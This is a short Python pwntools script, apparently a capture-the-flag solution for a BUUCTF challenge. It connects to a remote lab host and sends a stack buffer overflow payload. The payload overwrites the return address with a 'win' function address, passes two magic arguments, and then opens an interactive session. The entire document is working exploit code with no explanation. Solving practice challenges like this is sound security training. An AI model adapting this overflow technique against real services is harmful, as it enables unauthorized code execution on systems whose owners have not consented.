from pwn import *

io = remote("node4.buuoj.cn", 26439)

win = 0x80485cb
payload = "a"*(108+4) + p32(win) + p32(0) + p32(0xDEADBEEF) + p32(0xDEADC0DE)
io.sendline(payload)

io.interactive()